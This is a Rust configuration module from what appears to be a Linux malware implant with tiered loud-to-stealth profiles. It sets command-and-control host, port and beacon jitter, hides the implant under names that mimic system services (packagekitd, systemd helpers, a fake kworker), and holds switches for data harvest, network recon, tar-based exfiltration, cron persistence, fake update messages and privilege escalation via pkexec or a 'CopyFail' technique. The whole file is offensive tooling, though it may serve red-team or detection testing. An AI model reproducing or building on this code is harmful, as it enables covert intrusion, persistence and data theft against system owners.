/// Compile-time configuration — tier-aware defaults.
/// Values baked at build time via option_env!().

pub struct Config {
    pub c2_host: String,
    pub c2_port: u16,
    pub beacon_interval: u64,
    pub beacon_jitter: u64,    // max additional seconds before beacon send

    // Transport
    pub use_tls: bool,

    // Paths
    pub implant_path: String,
    pub staging_dir: String,

    // Process names
    pub worker_name: String,
    pub beacon_name: String,

    // Systemd
    pub service_name: String,
    pub service_description: String,

    // Beacon detection
    pub beacon_env_var: Option<String>, // e.g. Some("POLKIT_DAEMON") for tier3, None for tier1/2

    // Behavior flags
    pub cleanup_staging: bool,  // delete staging dir after exfil
    pub shell_harvest: bool,    // use cp/shell commands for harvest
    pub shell_recon: bool,      // use shell commands + ping sweep for recon
    pub ping_sweep: bool,       // do ping sweep on recon
    pub shell_exfil: bool,      // use forked tar -czf for exfil
    pub print_status: bool,     // print fake update messages to stdout
    pub cron_persist: bool,     // install @reboot cron as backup persistence
    pub escalate_via: EscalateMethod,

    // Pacing
    pub stage_pause_secs: u64,
    pub chunk_pause_secs: u64,
}

#[derive(PartialEq)]
pub enum EscalateMethod {
    Pkexec,   // tier1
    CopyFail, // tier2
    CopyFailFd9, // tier3: CopyFail + memfd + fd9 + double-fork
}

impl Config {
    pub fn load(tier: &str) -> Self {
        let c2_host = option_env!("C2_HOST").unwrap_or("10.170.22.213").into();
        let c2_port: u16 = option_env!("C2_PORT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(if tier == "1" { 80 } else { 443 });
        let beacon_interval = option_env!("BEACON_RATE")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0); // 0 = use tier default below

        match tier {
            "1" => Config {
                c2_host, c2_port,
                beacon_interval: if beacon_interval > 0 { beacon_interval } else { 60 },
                beacon_jitter: 0,
                use_tls: false,
                implant_path: "/usr/bin/update-checker".into(),
                staging_dir: "/tmp/.system-update".into(),
                worker_name: "system-updater".into(),
                beacon_name: "update-checker".into(),
                service_name: "update-checker.service".into(),
                service_description: "System Update Scheduler".into(),
                beacon_env_var: None,
                cleanup_staging: false,
                shell_harvest: true,
                shell_recon: true,
                ping_sweep: true,
                shell_exfil: true,
                print_status: true,
                cron_persist: true,
                escalate_via: EscalateMethod::Pkexec,
                stage_pause_secs: 3,
                chunk_pause_secs: 5,
            },
            "2" => Config {
                c2_host, c2_port,
                beacon_interval: if beacon_interval > 0 { beacon_interval } else { 180 },
                beacon_jitter: 120,
                use_tls: true,
                implant_path: "/usr/lib/systemd/systemd-session-helper".into(),
                staging_dir: "/tmp/.system-update".into(),
                worker_name: "systemd-session-helper".into(),
                beacon_name: "systemd-logind-helper".into(),
                service_name: "systemd-logind-helper.service".into(),
                service_description: "System Logind Session Helper".into(),
                beacon_env_var: None,
                cleanup_staging: true,
                shell_harvest: true,
                shell_recon: true,
                ping_sweep: true,
                shell_exfil: true,
                print_status: false,
                cron_persist: true,
                escalate_via: EscalateMethod::CopyFail,
                stage_pause_secs: 5,
                chunk_pause_secs: 5,
            },
            _ => Config { // tier3
                c2_host, c2_port,
                beacon_interval: if beacon_interval > 0 { beacon_interval } else { 600 },
                beacon_jitter: 300,
                use_tls: true,
                implant_path: "/usr/lib/packagekit/packagekitd".into(),
                staging_dir: String::new(),
                worker_name: "[kworker/0:2]".into(),
                beacon_name: "[packagekitd]".into(),
                service_name: "packagekit-backend.service".into(),
                service_description: "PackageKit Backend".into(),
                beacon_env_var: Some("POLKIT_DAEMON".into()),
                cleanup_staging: false,
                shell_harvest: false,
                shell_recon: false,
                ping_sweep: false,
                shell_exfil: false,
                print_status: false,
                cron_persist: false,
                escalate_via: EscalateMethod::CopyFailFd9,
                stage_pause_secs: 5,
                chunk_pause_secs: 5,
            },
        }
    }

    pub fn jitter(&self, range: u64) -> u64 {
        if range == 0 { return 0; }
        let mut buf = [0u8; 8];
        unsafe { libc::getrandom(buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0); }
        u64::from_le_bytes(buf) % range
    }

    pub fn tier_label(&self) -> &'static str {
        if self.escalate_via == EscalateMethod::Pkexec { "1-loud" }
        else if self.escalate_via == EscalateMethod::CopyFail && self.shell_exfil { "2-mixed" }
        else { "3-stealth" }
    }

    /// Sleep random [0, beacon_jitter] seconds — called at start of beacon mode.
    pub fn beacon_sleep(&self) {
        let delay = self.jitter(self.beacon_jitter);
        if delay == 0 { return; }
        let ts = libc::timespec { tv_sec: delay as _, tv_nsec: 0 };
        unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
    }

    /// Compute a stable implant identifier from hostname + first MAC address.
    pub fn implant_id(&self) -> String {
        let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
            .unwrap_or_default()
            .trim()
            .to_string();
        let mac = first_mac().unwrap_or_else(|| "unknown".into());
        format!("{}-{}", hostname, mac.replace(':', "-"))
    }

    /// Get the OS pretty name from /etc/os-release.
    pub fn get_os_info(&self) -> String {
        std::fs::read_to_string("/etc/os-release")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
            })
            .unwrap_or_else(|| "Linux".into())
    }
}

/// Get the first non-zero MAC address from /sys/class/net.
fn first_mac() -> Option<String> {
    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let addr_path = entry.path().join("address");
            if let Ok(mac) = std::fs::read_to_string(&addr_path) {
                let mac = mac.trim().to_string();
                if !mac.is_empty() && mac != "00:00:00:00:00:00" {
                    return Some(mac);
                }
            }
        }
    }
    None
}
